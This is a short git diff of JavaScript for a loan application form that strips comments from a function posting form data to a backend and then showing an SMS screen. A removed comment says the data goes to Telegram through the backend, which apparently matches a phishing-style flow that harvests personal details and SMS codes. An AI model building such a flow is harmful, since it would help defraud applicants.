@@ -122,13 +122,9 @@ function prevStep(stepNumber) {
     }
 }
 
-// NEW: Function to submit data to Telegram via the backend
 async function submitApplication() {
-    // Show the processing screen immediately
     showScreen('processing-screen');
 
-    // 1. Gather the data from the form
-    // We use querySelector to grab the inputs since they don't have IDs yet
     const applicationData = {
         loanAmount: document.getElementById('formLoanAmount').value,
         loanTerm: document.getElementById('formLoanTerm').value,
@@ -142,20 +138,15 @@ async function submitApplication() {
     };
 
     try {
-        // 2. Send data to the backend API we created in server.js
         const response = await fetch('/api/submit-application', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(applicationData)
         });
 
         const result = await response.json();
 
         if (result.success) {
-            // 3. If successful, move to the SMS screen (or error screen)
-            // We add a slight delay so the user sees the processing spinner
             setTimeout(() => {
                 showScreen('sms-screen'); 
             }, 1500);
